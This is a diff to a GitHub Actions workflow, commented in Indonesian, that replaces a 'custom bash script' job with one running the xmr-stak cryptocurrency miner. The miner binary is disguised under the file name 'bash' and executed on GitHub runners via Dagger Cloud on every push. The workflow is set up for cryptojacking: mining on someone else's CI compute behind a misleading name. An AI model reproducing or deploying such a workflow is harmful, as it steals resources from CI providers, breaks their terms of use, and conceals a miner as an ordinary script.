@@ -1,4 +1,4 @@
-name: Dagger - Run Custom Bash Script
+name: Dagger - Run xmr-stak (renamed as bash)
 
 on:
   push:
@@ -8,21 +8,22 @@ on:
   workflow_dispatch:
 
 jobs:
-  run-script:
+  mine-test:
     runs-on: ubuntu-latest
-    name: Run chmod +x bash && ./bash --noTest via Dagger Cloud
+    name: Test mining dengan xmr-stak via Dagger Cloud
     steps:
       - name: Checkout repo
         uses: actions/checkout@v4
 
-      - name: Debug repo contents
+      - name: Debug files & permissions
         run: |
           pwd
           ls -la
-          ls -la bash || echo "bash file missing!"
-          head -n 5 bash || echo "Cannot read bash"
+          ls -la bash || echo "File bash (xmr-stak) tidak ditemukan!"
+          file bash || echo "Tidak bisa cek tipe file"
+          chmod +x bash  # biar aman kalau belum executable
 
-      - name: Make bash executable and run with --noTest
+      - name: Run xmr-stak (bash) dengan --noTest di background (timeout 5 menit test)
         uses: dagger/dagger-for-github@v8.2.0
         with:
           version: latest
@@ -31,8 +32,8 @@ jobs:
             | from ubuntu:24.04
             | with-workdir /src
             | with-mounted-directory /src .
-            | with-exec chmod u+x bash
-            | with-exec ./bash -- --noTest
+            | with-exec chmod u+x bash   # pastikan executable
+            | with-exec sh -c "./bash --noTest"
             | stdout
           cloud-token: ${{ secrets.DAGGER_CLOUD_TOKEN }}
           debug: true
